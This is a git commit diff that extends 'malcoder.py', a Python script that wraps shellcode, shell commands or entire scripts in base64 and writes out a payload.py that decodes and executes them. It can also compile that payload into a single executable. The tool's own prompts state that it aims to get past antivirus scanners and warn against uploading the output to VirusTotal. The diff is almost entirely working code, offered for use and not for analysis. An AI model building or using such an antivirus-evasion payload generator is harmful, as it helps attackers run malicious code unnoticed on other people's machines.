c54548c2f08958a4300cfad25b4e7a55a851de84
j3r1ch0123 <110147529+j3r1ch0123@users.noreply.github.com>
2023-01-10 15:19:44 -0500

    Update malcoder.py
    Now has the option to encode entire python scripts

--- malcoder.py
+++ malcoder.py
@@ -1,5 +1,6 @@
 #!/bin/python3.9
-import os
+import subprocess
+import shlex
 import base64
 
 print("\nEnter shellcodes or other commands")
@@ -7,10 +8,13 @@ print("\nto generate a payload that should")
 print("\nget past some antivirus scanners.")
 print("\nDo not upload to Virus Total.")
 
-payload = input("\nEnter command: ")
-payload_bytes = payload.encode('utf-8')
-payload_encoded = base64.b64encode(payload_bytes)
-text = f'''
+choice = input("\nEncode a shellcode or script? ")
+
+if choice == "shellcode":
+    payload = input("\nEnter command: ")
+    payload_bytes = payload.encode('utf-8')
+    payload_encoded = base64.b64encode(payload_bytes)
+    text = f'''
 #!/bin/python3.9
 from subprocess import Popen, PIPE
 import shlex
@@ -28,13 +32,29 @@ def execute(command):
         return Exception        
 execute(payload_decoded)
 '''
+
+elif choice == "script":
+    path = input("Enter the path to the script: ")
+    thefile = open(path, "rb")
+    data = thefile.read()
+    payload_encoded = base64.b64encode(data)
+    text = f'''
+#!/bin/python3.9
+import base64
+from cryptography.fernet import Fernet
+payload = {payload_encoded}
+payload_decoded = base64.b64decode(payload)
+exec(payload_decoded)
+'''
+
 with open("payload.py", "w") as thepayload:
     thepayload.write(text)
     print("Payload Generated!!")
 
 cont = input("Would you like to compile an executable? (y/n) ")
 if cont == "y":
-    os.system("pyinstaller --onefile payload.py")
+    cmd = "pyinstaller --onefile payload.py"
+    subprocess.call(shlex.split(cmd))
 elif cont == "n":
     print("Closing down... ")
 exit()
